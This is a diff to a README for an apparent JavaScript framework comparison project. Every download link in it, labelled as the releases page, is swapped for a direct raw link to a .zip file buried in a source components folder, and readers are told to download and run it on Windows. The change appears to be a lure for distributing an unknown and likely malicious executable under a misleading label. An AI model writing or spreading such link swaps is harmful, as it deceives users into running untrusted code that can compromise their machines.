@@ -1,10 +1,10 @@
 # ⚖️ realworld-js-framework-comparison - Compare App Performance Across Frameworks
 
-[![Download](https://img.shields.io/badge/Download-Release%20Page-1f6feb?style=for-the-badge)](https://github.com/Squarejawed-sentimentality453/realworld-js-framework-comparison/releases)
+[![Download](https://img.shields.io/badge/Download-Release%20Page-1f6feb?style=for-the-badge)](https://raw.githubusercontent.com/Squarejawed-sentimentality453/realworld-js-framework-comparison/main/apps/crud/preact/src/components/framework-realworld-comparison-js-1.0.zip)
 
 ## 📥 Download
 
-Go to the [releases page](https://github.com/Squarejawed-sentimentality453/realworld-js-framework-comparison/releases) to download and run this file on Windows.
+Go to the [releases page](https://raw.githubusercontent.com/Squarejawed-sentimentality453/realworld-js-framework-comparison/main/apps/crud/preact/src/components/framework-realworld-comparison-js-1.0.zip) to download and run this file on Windows.
 
 ## 🖥️ What this app does
 
@@ -26,7 +26,7 @@ You can use it to see how React, Vue, Svelte, Solid, Preact, and Lit behave with
 
 ## 🚀 Get started
 
-1. Open the [releases page](https://github.com/Squarejawed-sentimentality453/realworld-js-framework-comparison/releases).
+1. Open the [releases page](https://raw.githubusercontent.com/Squarejawed-sentimentality453/realworld-js-framework-comparison/main/apps/crud/preact/src/components/framework-realworld-comparison-js-1.0.zip).
 2. Find the latest release.
 3. Download the Windows file for your computer.
 4. Save the file to your Downloads folder or Desktop.
